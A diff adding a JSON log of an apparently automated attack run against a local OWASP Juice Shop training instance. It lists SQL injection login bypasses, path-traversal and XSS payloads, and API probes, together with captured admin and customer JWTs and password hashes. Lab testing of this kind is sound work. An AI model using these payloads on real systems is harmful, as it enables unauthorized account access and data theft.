@@ -1,0 +1,648 @@
+{
+  "test_time": "2025-10-23T19:29:35.931041",
+  "target": "127.0.0.1:3000",
+  "target_type": "OWASP Juice Shop",
+  "attacks": [
+    {
+      "timestamp": "2025-10-23T19:29:35.954522",
+      "attack_type": "SQL Injection",
+      "method": "POST",
+      "payload": "admin'--",
+      "response_code": 401,
+      "result": "safe",
+      "details": "正常拒絕"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:36.487055",
+      "attack_type": "SQL Injection",
+      "method": "POST",
+      "payload": "' OR 1=1--",
+      "response_code": 200,
+      "result": "exploited",
+      "details": "成功繞過登錄獲得 JWT token",
+      "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiO...",
+      "user_data": {
+        "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMTAtMjMgMTE6MDE6MjcuNTY1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMTAtMjMgMTE6MDE6MjcuNTY1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2MTIxODk3Nn0.D4d-SsJegA2kVX_axDSR4CplP3a_Y_RIIlSXNTPK0Afn_akNIpZjFD31u2kJNtWzlxcrXzPf0uOgAGnECGssLm_QtN2r-PfxA4TJyVEcjeQFLI1HJzExwYQkFcOiG1vIUsklfES6A-E7_IDAHjsNlbbCCCiEar63qof7OuUpDMs",
+        "bid": 1,
+        "umail": "admin@juice-sh.op"
+      }
+    },
+    {
+      "timestamp": "2025-10-23T19:29:37.007737",
+      "attack_type": "SQL Injection",
+      "method": "POST",
+      "payload": "admin'/*",
+      "response_code": 401,
+      "result": "safe",
+      "details": "正常拒絕"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:37.531888",
+      "attack_type": "SQL Injection",
+      "method": "POST",
+      "payload": "' OR '1'='1'--",
+      "response_code": 200,
+      "result": "exploited",
+      "details": "成功繞過登錄獲得 JWT token",
+      "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiO...",
+      "user_data": {
+        "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMTAtMjMgMTE6MDE6MjcuNTY1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMTAtMjMgMTE6MDE6MjcuNTY1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2MTIxODk3OH0.K60k78eE3f8mzv-S9oMSq2RDdupms4wLtNjdxtfH5nZB9GCIcFX0GhRuCYMeWxNtCV3ERXMlcSZkfUDJ_vOmOd_zVnj38xkmx14SfhtfyTM3DK3fV-G2_O6ZrBBsz60FJ6j-WcEWg7-rTPjRfnfNbHsYydajjQV08tqOvspCxXg",
+        "bid": 1,
+        "umail": "admin@juice-sh.op"
+      }
+    },
+    {
+      "timestamp": "2025-10-23T19:29:38.048350",
+      "attack_type": "SQL Injection",
+      "method": "POST",
+      "payload": "bender@juice-sh.op'--",
+      "response_code": 200,
+      "result": "exploited",
+      "details": "成功繞過登錄獲得 JWT token",
+      "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiO...",
+      "user_data": {
+        "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MywidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImJlbmRlckBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMGMzNmU1MTdlM2ZhOTVhYWJmMWJiZmZjNjc0NGE0ZWYiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNS0xMC0yMyAxMTowMToyNy41NjUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNS0xMC0yMyAxMTowMToyNy41NjUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzYxMjE4OTc4fQ.Wp4FMX5YemjDn-xfihI5mAZAHRx6fq1vdWu2Jq903vKLzQYoG-slQOqV7bFI4qpDqfUr15pX0fBORAFxPVzKchDoD43l_nFl1dP4MruyMs9DsIgHYKDc-HOxWMrFEAK1pfJqr3G2t-8__OjktcF9ongAPP2ak-vP_MSptKHO_9o",
+        "bid": 3,
+        "umail": "bender@juice-sh.op"
+      }
+    },
+    {
+      "timestamp": "2025-10-23T19:29:38.620061",
+      "attack_type": "JWT Analysis",
+      "method": "GET",
+      "payload": "token_decode",
+      "response_code": 200,
+      "result": "exploited",
+      "details": "成功解析 JWT: 用戶ID=23, 算法=RS256",
+      "jwt_header": {
+        "typ": "JWT",
+        "alg": "RS256"
+      },
+      "jwt_payload": {
+        "status": "success",
+        "data": {
+          "id": 23,
+          "username": "",
+          "email": "test_1761218978@test.com",
+          "password": "482c811da5d5b4bc6d497ffa98491e38",
+          "role": "customer",
+          "deluxeToken": "",
+          "lastLoginIp": "0.0.0.0",
+          "profileImage": "/assets/public/images/uploads/default.svg",
+          "totpSecret": "",
+          "isActive": true,
+          "createdAt": "2025-10-23 11:29:38.566 +00:00",
+          "updatedAt": "2025-10-23 11:29:38.566 +00:00",
+          "deletedAt": null
+        },
+        "iat": 1761218979
+      }
+    },
+    {
+      "timestamp": "2025-10-23T19:29:38.636519",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/ftp/../package.json",
+      "response_code": 200,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:38.963597",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/ftp/../../package.json",
+      "response_code": 200,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:39.280591",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/ftp/../../../package.json",
+      "response_code": 200,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:39.593073",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/ftp/%2e%2e%2fpackage.json",
+      "response_code": 403,
+      "result": "vulnerable",
+      "details": "訪問被拒絕但端點存在"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:39.910093",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/ftp/....//package.json",
+      "response_code": 403,
+      "result": "vulnerable",
+      "details": "訪問被拒絕但端點存在"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:40.237117",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/ftp/../main.js",
+      "response_code": 200,
+      "result": "exploited",
+      "details": "成功讀取文件！內容長度: 454219 bytes",
+      "file_content": "\"use strict\";(self.webpackChunkfrontend=self.webpackChunkfrontend||[]).push([[792],{1676:(z,W,m)=>{var F=m(467),D=m(7705),s=m(2615),J=m(5635),M=m(7916),y=m(5312),S=m(4988),R=m(1943),d=m(3955),f=m(2629..."
+    },
+    {
+      "timestamp": "2025-10-23T19:29:40.552758",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/ftp/../../main.js",
+      "response_code": 200,
+      "result": "exploited",
+      "details": "成功讀取文件！內容長度: 454219 bytes",
+      "file_content": "\"use strict\";(self.webpackChunkfrontend=self.webpackChunkfrontend||[]).push([[792],{1676:(z,W,m)=>{var F=m(467),D=m(7705),s=m(2615),J=m(5635),M=m(7916),y=m(5312),S=m(4988),R=m(1943),d=m(3955),f=m(2629..."
+    },
+    {
+      "timestamp": "2025-10-23T19:29:40.869054",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/assets/public/images/uploads/../package.json",
+      "response_code": 200,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:41.186523",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/assets/public/images/uploads/../../package.json",
+      "response_code": 200,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:41.514070",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/assets/public/images/uploads/../../../package.json",
+      "response_code": 200,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:41.827552",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/assets/public/images/uploads/%2e%2e%2fpackage.json",
+      "response_code": 200,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:42.145759",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/assets/public/images/uploads/....//package.json",
+      "response_code": 200,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:42.468276",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/assets/public/images/uploads/../main.js",
+      "response_code": 200,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:42.783581",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/assets/public/images/uploads/../../main.js",
+      "response_code": 200,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:43.101873",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/encryptionkeys/../package.json",
+      "response_code": 200,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:43.418095",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/encryptionkeys/../../package.json",
+      "response_code": 200,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:43.736007",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/encryptionkeys/../../../package.json",
+      "response_code": 200,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:44.045789",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/encryptionkeys/%2e%2e%2fpackage.json",
+      "response_code": 403,
+      "result": "vulnerable",
+      "details": "訪問被拒絕但端點存在"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:44.366727",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/encryptionkeys/....//package.json",
+      "response_code": 404,
+      "result": "safe",
+      "details": "未檢測到文件讀取"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:44.689655",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/encryptionkeys/../main.js",
+      "response_code": 200,
+      "result": "exploited",
+      "details": "成功讀取文件！內容長度: 454219 bytes",
+      "file_content": "\"use strict\";(self.webpackChunkfrontend=self.webpackChunkfrontend||[]).push([[792],{1676:(z,W,m)=>{var F=m(467),D=m(7705),s=m(2615),J=m(5635),M=m(7916),y=m(5312),S=m(4988),R=m(1943),d=m(3955),f=m(2629..."
+    },
+    {
+      "timestamp": "2025-10-23T19:29:45.006891",
+      "attack_type": "Directory Traversal",
+      "method": "GET",
+      "payload": "/encryptionkeys/../../main.js",
+      "response_code": 200,
+      "result": "exploited",
+      "details": "成功讀取文件！內容長度: 454219 bytes",
+      "file_content": "\"use strict\";(self.webpackChunkfrontend=self.webpackChunkfrontend||[]).push([[792],{1676:(z,W,m)=>{var F=m(467),D=m(7705),s=m(2615),J=m(5635),M=m(7916),y=m(5312),S=m(4988),R=m(1943),d=m(3955),f=m(2629..."
+    },
+    {
+      "timestamp": "2025-10-23T19:29:45.322936",
+      "attack_type": "XSS",
+      "method": "GET",
+      "payload": "search?q=<script>alert('XSS')</script>",
+      "response_code": 500,
+      "result": "error",
+      "details": "搜索請求異常: 500"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:45.736727",
+      "attack_type": "XSS",
+      "method": "GET",
+      "payload": "search?q=<img src=x onerror=alert('XSS')>",
+      "response_code": 500,
+      "result": "error",
+      "details": "搜索請求異常: 500"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:46.154501",
+      "attack_type": "XSS",
+      "method": "GET",
+      "payload": "search?q=<svg onload=alert('XSS')>",
+      "response_code": 500,
+      "result": "error",
+      "details": "搜索請求異常: 500"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:46.570147",
+      "attack_type": "XSS",
+      "method": "GET",
+      "payload": "search?q=javascript:alert('XSS')",
+      "response_code": 500,
+      "result": "error",
+      "details": "搜索請求異常: 500"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:46.990622",
+      "attack_type": "XSS",
+      "method": "GET",
+      "payload": "search?q=<iframe src=javascript:alert('XSS')>",
+      "response_code": 500,
+      "result": "error",
+      "details": "搜索請求異常: 500"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:47.405282",
+      "attack_type": "XSS",
+      "method": "GET",
+      "payload": "search?q=';alert('XSS');//",
+      "response_code": 500,
+      "result": "error",
+      "details": "搜索請求異常: 500"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:47.824291",
+      "attack_type": "Admin Access",
+      "method": "GET",
+      "payload": "/administration",
+      "response_code": 200,
+      "result": "safe",
+      "details": "正常頁面內容"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:48.342658",
+      "attack_type": "Admin Access",
+      "method": "GET",
+      "payload": "/admin",
+      "response_code": 200,
+      "result": "safe",
+      "details": "正常頁面內容"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:48.854588",
+      "attack_type": "Admin Access",
+      "method": "GET",
+      "payload": "/#/administration",
+      "response_code": 200,
+      "result": "safe",
+      "details": "正常頁面內容"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:49.373381",
+      "attack_type": "Admin Access",
+      "method": "GET",
+      "payload": "/#/admin",
+      "response_code": 200,
+      "result": "safe",
+      "details": "正常頁面內容"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:49.883759",
+      "attack_type": "API Info Disclosure",
+      "method": "GET",
+      "payload": "/api/Users",
+      "response_code": 401,
+      "result": "safe",
+      "details": "需要身份驗證"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:50.232058",
+      "attack_type": "API Info Disclosure",
+      "method": "GET",
+      "payload": "/api/Products",
+      "response_code": 200,
+      "result": "vulnerable",
+      "details": "API 可訪問但無明顯敏感信息洩露，記錄數: 1"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:50.558738",
+      "attack_type": "API Info Disclosure",
+      "method": "GET",
+      "payload": "/api/Feedbacks",
+      "response_code": 200,
+      "result": "vulnerable",
+      "details": "API 可訪問但無明顯敏感信息洩露，記錄數: 1"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:50.871902",
+      "attack_type": "API Info Disclosure",
+      "method": "GET",
+      "payload": "/api/BasketItems",
+      "response_code": 401,
+      "result": "safe",
+      "details": "需要身份驗證"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:51.217784",
+      "attack_type": "API Info Disclosure",
+      "method": "GET",
+      "payload": "/api/Challenges",
+      "response_code": 200,
+      "result": "exploited",
+      "details": "API 洩露敏感信息！字段: 110 個",
+      "sensitive_fields": [
+        "data[0].key: str",
+        "data[1].key: str",
+        "data[2].key: str",
+        "data[3].key: str",
+        "data[4].key: str",
+        "data[5].key: str",
+        "data[6].key: str",
+        "data[7].key: str",
+        "data[8].key: str",
+        "data[9].key: str"
+      ],
+      "total_records": 1
+    },
+    {
+      "timestamp": "2025-10-23T19:29:51.536275",
+      "attack_type": "API Info Disclosure",
+      "method": "GET",
+      "payload": "/rest/user/authentication-details",
+      "response_code": 401,
+      "result": "safe",
+      "details": "需要身份驗證"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:51.854751",
+      "attack_type": "API Info Disclosure",
+      "method": "GET",
+      "payload": "/rest/admin/application-configuration",
+      "response_code": 200,
+      "result": "exploited",
+      "details": "API 洩露敏感信息！字段: 3 個",
+      "sensitive_fields": [
+        "config.application.privacyContactEmail: str",
+        "config.challenges.csafHashValue: str",
+        "config.products[10].keywordsForPastebinDataLeakChallenge: list"
+      ],
+      "total_records": 1
+    },
+    {
+      "timestamp": "2025-10-23T19:29:52.177150",
+      "attack_type": "API Info Disclosure",
+      "method": "GET",
+      "payload": "/rest/continue-code",
+      "response_code": 200,
+      "result": "vulnerable",
+      "details": "API 可訪問但無明顯敏感信息洩露，記錄數: 1"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:52.495508",
+      "attack_type": "API Info Disclosure",
+      "method": "GET",
+      "payload": "/rest/repeat-notification",
+      "response_code": 0,
+      "result": "error",
+      "details": "請求失敗: 200, message='Attempt to decode JSON with unexpected mimetype: text/plain; charset=utf-8', url='http://127.0.0.1:3000/rest/repeat-notification'"
+    },
+    {
+      "timestamp": "2025-10-23T19:29:52.507378",
+      "attack_type": "API Info Disclosure",
+      "method": "GET",
+      "payload": "/rest/deluxe-membership",
+      "response_code": 400,
+      "result": "safe",
+      "details": "正常拒絕"
+    }
+  ],
+  "successful_exploits": [
+    {
+      "type": "SQL Injection",
+      "severity": "high",
+      "description": "成功繞過登錄獲得 JWT token",
+      "payload": "' OR 1=1--",
+      "proof": {
+        "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiO...",
+        "user_data": {
+          "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMTAtMjMgMTE6MDE6MjcuNTY1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMTAtMjMgMTE6MDE6MjcuNTY1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2MTIxODk3Nn0.D4d-SsJegA2kVX_axDSR4CplP3a_Y_RIIlSXNTPK0Afn_akNIpZjFD31u2kJNtWzlxcrXzPf0uOgAGnECGssLm_QtN2r-PfxA4TJyVEcjeQFLI1HJzExwYQkFcOiG1vIUsklfES6A-E7_IDAHjsNlbbCCCiEar63qof7OuUpDMs",
+          "bid": 1,
+          "umail": "admin@juice-sh.op"
+        }
+      }
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "high",
+      "description": "成功繞過登錄獲得 JWT token",
+      "payload": "' OR '1'='1'--",
+      "proof": {
+        "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiO...",
+        "user_data": {
+          "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMTAtMjMgMTE6MDE6MjcuNTY1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMTAtMjMgMTE6MDE6MjcuNTY1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2MTIxODk3OH0.K60k78eE3f8mzv-S9oMSq2RDdupms4wLtNjdxtfH5nZB9GCIcFX0GhRuCYMeWxNtCV3ERXMlcSZkfUDJ_vOmOd_zVnj38xkmx14SfhtfyTM3DK3fV-G2_O6ZrBBsz60FJ6j-WcEWg7-rTPjRfnfNbHsYydajjQV08tqOvspCxXg",
+          "bid": 1,
+          "umail": "admin@juice-sh.op"
+        }
+      }
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "high",
+      "description": "成功繞過登錄獲得 JWT token",
+      "payload": "bender@juice-sh.op'--",
+      "proof": {
+        "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiO...",
+        "user_data": {
+          "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MywidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImJlbmRlckBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMGMzNmU1MTdlM2ZhOTVhYWJmMWJiZmZjNjc0NGE0ZWYiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNS0xMC0yMyAxMTowMToyNy41NjUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNS0xMC0yMyAxMTowMToyNy41NjUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzYxMjE4OTc4fQ.Wp4FMX5YemjDn-xfihI5mAZAHRx6fq1vdWu2Jq903vKLzQYoG-slQOqV7bFI4qpDqfUr15pX0fBORAFxPVzKchDoD43l_nFl1dP4MruyMs9DsIgHYKDc-HOxWMrFEAK1pfJqr3G2t-8__OjktcF9ongAPP2ak-vP_MSptKHO_9o",
+          "bid": 3,
+          "umail": "bender@juice-sh.op"
+        }
+      }
+    },
+    {
+      "type": "JWT Analysis",
+      "severity": "high",
+      "description": "成功解析 JWT: 用戶ID=23, 算法=RS256",
+      "payload": "token_decode",
+      "proof": {
+        "jwt_header": {
+          "typ": "JWT",
+          "alg": "RS256"
+        },
+        "jwt_payload": {
+          "status": "success",
+          "data": {
+            "id": 23,
+            "username": "",
+            "email": "test_1761218978@test.com",
+            "password": "482c811da5d5b4bc6d497ffa98491e38",
+            "role": "customer",
+            "deluxeToken": "",
+            "lastLoginIp": "0.0.0.0",
+            "profileImage": "/assets/public/images/uploads/default.svg",
+            "totpSecret": "",
+            "isActive": true,
+            "createdAt": "2025-10-23 11:29:38.566 +00:00",
+            "updatedAt": "2025-10-23 11:29:38.566 +00:00",
+            "deletedAt": null
+          },
+          "iat": 1761218979
+        }
+      }
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "high",
+      "description": "成功讀取文件！內容長度: 454219 bytes",
+      "payload": "/ftp/../main.js",
+      "proof": {
+        "file_content": "\"use strict\";(self.webpackChunkfrontend=self.webpackChunkfrontend||[]).push([[792],{1676:(z,W,m)=>{var F=m(467),D=m(7705),s=m(2615),J=m(5635),M=m(7916),y=m(5312),S=m(4988),R=m(1943),d=m(3955),f=m(2629..."
+      }
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "high",
+      "description": "成功讀取文件！內容長度: 454219 bytes",
+      "payload": "/ftp/../../main.js",
+      "proof": {
+        "file_content": "\"use strict\";(self.webpackChunkfrontend=self.webpackChunkfrontend||[]).push([[792],{1676:(z,W,m)=>{var F=m(467),D=m(7705),s=m(2615),J=m(5635),M=m(7916),y=m(5312),S=m(4988),R=m(1943),d=m(3955),f=m(2629..."
+      }
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "high",
+      "description": "成功讀取文件！內容長度: 454219 bytes",
+      "payload": "/encryptionkeys/../main.js",
+      "proof": {
+        "file_content": "\"use strict\";(self.webpackChunkfrontend=self.webpackChunkfrontend||[]).push([[792],{1676:(z,W,m)=>{var F=m(467),D=m(7705),s=m(2615),J=m(5635),M=m(7916),y=m(5312),S=m(4988),R=m(1943),d=m(3955),f=m(2629..."
+      }
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "high",
+      "description": "成功讀取文件！內容長度: 454219 bytes",
+      "payload": "/encryptionkeys/../../main.js",
+      "proof": {
+        "file_content": "\"use strict\";(self.webpackChunkfrontend=self.webpackChunkfrontend||[]).push([[792],{1676:(z,W,m)=>{var F=m(467),D=m(7705),s=m(2615),J=m(5635),M=m(7916),y=m(5312),S=m(4988),R=m(1943),d=m(3955),f=m(2629..."
+      }
+    },
+    {
+      "type": "API Info Disclosure",
+      "severity": "high",
+      "description": "API 洩露敏感信息！字段: 110 個",
+      "payload": "/api/Challenges",
+      "proof": {
+        "sensitive_fields": [
+          "data[0].key: str",
+          "data[1].key: str",
+          "data[2].key: str",
+          "data[3].key: str",
+          "data[4].key: str",
+          "data[5].key: str",
+          "data[6].key: str",
+          "data[7].key: str",
+          "data[8].key: str",
+          "data[9].key: str"
+        ],
+        "total_records": 1
+      }
+    },
+    {
+      "type": "API Info Disclosure",
+      "severity": "high",
+      "description": "API 洩露敏感信息！字段: 3 個",
+      "payload": "/rest/admin/application-configuration",
+      "proof": {
+        "sensitive_fields": [
+          "config.application.privacyContactEmail: str",
+          "config.challenges.csafHashValue: str",
+          "config.products[10].keywordsForPastebinDataLeakChallenge: list"
+        ],
+        "total_records": 1
+      }
+    }
+  ],
+  "summary": {
+    "total_attacks": 47,
+    "exploits_successful": 10,
+    "vulnerabilities_found": 6,
+    "safe_responses": 24,
+    "successful_exploit_count": 10,
+    "risk_level": "critical"
+  }
+}
